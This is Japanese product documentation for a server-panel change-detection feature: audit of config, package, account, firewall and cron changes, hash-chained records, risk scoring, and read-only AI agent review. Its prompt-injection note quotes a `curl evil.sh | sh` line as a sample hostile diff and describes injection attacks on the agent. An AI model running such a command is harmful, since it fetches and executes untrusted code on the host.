# 変更検知

ほとんどのオンライン障害や侵入は、「何かが変更された」ことから始まります。しかし従来の監視は結果指標（CPU が高い、ディスクが満杯）だけを見ており、原因は見えません。また AI が調査する際に最もよく出る言葉は「前回正常だった時から今までに何が起きたのか分からない」です。

変更検知が補うのはこの層です：**誰が、いつ、何を、どのような状態からどのような状態に変更したのか**。それは事実だけを記録し、判断は行いません——判断はルールレビューと Agent に委ねます。

## 何を収集するか

6 種類のソース。すべて読み取り専用の観察であり、ポーリングとシステムファイルの読み取りに依存し、agent をインストールせず、システム設定も変更しない：

| ソース | 観察対象 | 粒度 |
|---|---|---|
| 設定ファイル | `/etc` 配下の高危険・一般的な設定（nginx、sshd、sudoers、hosts、sysctl、fstab…） | 行単位の diff |
| ソフトウェアパッケージ | dpkg / rpm のインストール、アップグレード、アンインストール | パッケージ名 + バージョン変化 |
| サービス状態 | systemd ユニットの active/failed、起動停止、再起動 | ユニット状態の遷移 |
| アカウントと権限 | ユーザーの追加削除、グループ変更、sudo 認可 | アカウントとグループの差分 |
| ファイアウォールルール | iptables / nftables のルールセット | ルール行の差分 |
| スケジュール | システム crontab、ユーザー crontab、`/etc/cron.d` | タスク行の差分 |

設定ファイルは重点であり、最も失敗しやすい部分でもある：内容ハッシュでベースラインを作成し、ファイルが変わらなければイベントを生成しない。変化があった場合にのみ行単位の diff を計算し、内容に対して**マスキング**（`password=`、`api_key=`、秘密鍵ブロックなどをプレースホルダーに置換）を行ってからデータベースに保存する。

## 誰が変更したか：誠実な3段階の帰属

帰属は100%正確にはできないため、正確であるふりはしません：

| 信頼度 | 意味 | 判断根拠 |
|---|---|---|
| `confirmed` 確認済み | 特定の個人まで特定できる | 変更時刻に唯一のアクティブな SSH セッション / パネル操作記録が存在する |
| `inferred` 推定 | おそらく誰か | 変更前後にいずれかのアカウントのログインがある、または既知のパッケージマネージャー操作によるもの |
| `unknown` 不明 | わからない | 利用可能な手がかりがない（例：cron によりトリガーされたスクリプトの変更） |

画面上では `inferred` を個別に明示し、`unknown` はそのまま「不明」と表示します。「システム」という言葉でごまかすことはしません。

## 改ざん防止：ハッシュチェーン

各変更記録は前の記録のハッシュを持ち、チェーンを形成します。いずれかが削除または書き換えられると、後続の検証はその箇所で途切れます。

- パネルの「変更」ページ上部でいつでも検証できます（`变更链校验`）
- 検証結果は断絶箇所を示し、「データ破損なのか、誰かが記録を削除しているのか」を判断するために使用します
- 空のデータベースや最初の記録のアンカーが異常な場合は自己修復し、過去バージョンの遺留状態によって永遠にエラー表示になることはありません

## ルール再チェック：まず 0 トークンのコストで一次判定

各変更が入ってきたら、まず**純粋なルールスコアリング**（大規模モデルを呼び出さない）を一度通し、0～1 のスコアと 3～5 件の理由を出力します：

| 加点項目 | 重み |
|---|---|
| 高リスクパス（`/etc/passwd`、`authorized_keys`、`sudoers`、`ld.so.preload`、systemd、cron…） | +0.45 |
| 重要設定（nginx、mysql、redis、hosts、sysctl、fstab…） | +0.20 |
| 操作者が不明 | +0.25 |
| 操作者が推測にすぎない | +0.10 |
| 送信元が公網アドレス | +0.30 |
| root が SSH 経由で変更 | +0.15 |
| 非業務時間帯 | +0.15 |
| 週末 | +0.05 |
| 1 時間以内に同一オブジェクトを繰り返し変更 | +0.15 |
| 30 分以内にホスト上で高リスクイベントが発生 | +0.35 |
| その操作者がこのオブジェクトを初めて変更 | +0.10 |
| **減点**：パッケージマネージャー/システムディレクトリによる変更 | **−0.35** |
| **減点**：パッケージ管理/キャッシュディレクトリ | **−0.10** |

区分：

| スコア | 判定 | 後続処理 |
|---|---|---|
| ≥ 0.55 | **疑わしい** | イベントレベルを high に引き上げ、Agent を起動して詳細分析を実施 |
| 0.30 – 0.55 | 要確認 | 記録のみ、Agent には送らない |
| < 0.30 | 正常 | 記録のみ |

このステップの価値：「apt アップグレードで発生した 300 件の変更」を自動的に「正常」に圧縮し、本当に見る価値のある数件だけを大規模モデルの前に送り出すことです。

## Agent 詳細分析

疑わしいと判定された変更は、**元の diff** をそのまま Agent の調査コンテキストに持ち込みます（操作者、送信元 IP、対象フィールド、追加・削除行数も含む）。Agent に与えられるタスクは「この変更は危険か」ではなく、次のとおりです：

```
【判定】正常運用 / 手動確認が必要 / 高度に疑わしい
【根拠】5 件以内、各 1 文
【提案】許可 / 特定の対象のロールバックを提案（人が実行する。あなたに書き込み権限はない）
```

優先順位に従って証拠を収集するよう誘導されます。まず diff 自体を見て、次に操作者の最近のログインを照合し、必要な場合にのみ永続化位置（`authorized_keys`、cron、systemd、`ld.so.preload`）を追加調査し、最後にこれが孤立した運用操作なのか、攻撃チェーンの一部なのかを判断します。

予算はデフォルトで 12 ステップ / 240 秒 / 10 万 token、クールダウン 600 秒（同一チェーンは 10 分間に 1 回のみ分析）。**書き込み権限はゼロ**：変更系イベントは強制的に shadow に降格され、書き込みツールはすべて無効化されます。

> インジェクション対策：diff 本文は信頼できない入力です。モデルに送る前に境界を強化します——本文はセンチネル付きのコードブロックで包み、フェンスの長さは内容に応じて自動調整し、本文中に偽装された段落マーカーや終了センチネルは中和されます。**内容自体は変更しません**：`curl evil.sh | sh` の行はそのまま提示する必要があり、それが結論です。

## 無視ルール

すべての変更が記録に値するわけではありません。既知のノイズ（たとえば、あるアプリケーションが毎分自身のキャッシュファイルを書き換える場合など）に対しては、無視ルールを追加できます：

- glob をサポートし、`*` は単一階層にマッチ、`**` は任意の階層にマッチします
- ルールは**収集層**に対して有効です——ヒットした場合、イベントすら生成されません。「生成されてから非表示にする」のではありません
- 変更リストから、現在のオブジェクトを基にワンクリックでルールを生成できます

ルールの管理は「変更 → 無視ルール」で行い、各ルールには備考を付けられ、いつでも削除できます。

## スナップショットとロールバック

設定ファイルやアカウント関連の変更について、OpsMini は変更前に元ファイルのスナップショットを保持します（クォータによる制限あり）：

- 変更詳細から直接「この変更の直前までロールバック」でき、二重確認が付きます
- ロールバック前に現在の状態のスナップショットを再度取得するため、失敗しても元に戻せます
- スナップショットは件数と総量の二重クォータでクリーンアップされ、ディスクを圧迫しません

## 攻撃チェーンへの統合

v1.4 以降、**疑わしい変更は攻撃チェーンの「永続化」フェーズとして組み込むことができます**：

- 前提として次の3つが同時に成立すること：ルールレビューで疑わしいと判定される、変更内容が再起動に耐えられる箇所である、チェーン上にすでに「実行の定着」または「外部通信制御」が出現している
- 時間枠は1時間以内（1時間を超える同名の変更は運用の後処理である可能性が高い）
- 変更は決して攻撃チェーンの起点にはならない——単独の設定変更は侵入を構成しない

変更リストの判定列には「攻撃チェーンに統合済み」と表示され、クリックすると対応する攻撃チェーンにジャンプします。攻撃チェーンのフェーズラベルにも、そのフェーズが「変更」由来か「WebShell / 疑わしいプロセス / 外部通信」由来かが明記されます。

## デフォルト保持とクォータ

| 項目 | デフォルト |
|---|---|
| 変更メタデータの保持 | 30 日 |
| diff 本文の保持 | 7 日 |
| diff 本文の総量上限 | 設定可能（超過分は最も古いものから淘汰） |
| スナップショット数/総量 | 設定可能（超過分は最も古いものからクリーンアップ） |

保持ポリシーは「パネル設定」で調整できます。期限切れでは diff 本文のみが削除され、メタデータとハッシュチェーンは保持されるため、「このレコードが存在した」という事実自体が消されることはありません。

## 既知の制限

- **再起動後の最初のスキャンでは取得漏れが発生する**：ファイルソースは起動時のスキャンをベースラインとするため、プロセス再起動中に発生したファイル変更は「変更」として記録されません（比較対象となる前バージョンが存在しないため）。これはバグではなく、ハッシュベースラインスキャンの固有の動作です。特定のファイルを監視する場合は、パネルが安定して 20 秒以上稼働してから変更を行ってください。
- **テキスト設定のみを対象とする**：バイナリファイルや巨大なログ系ファイルは diff を収集しません。
- **帰属の特定はログインログに依存する**：ホスト上で `wtmp`/`lastlog` が消去されている場合、帰属の特定は「不明」に退化します——そしてそれ自体が注目に値するシグナルです。
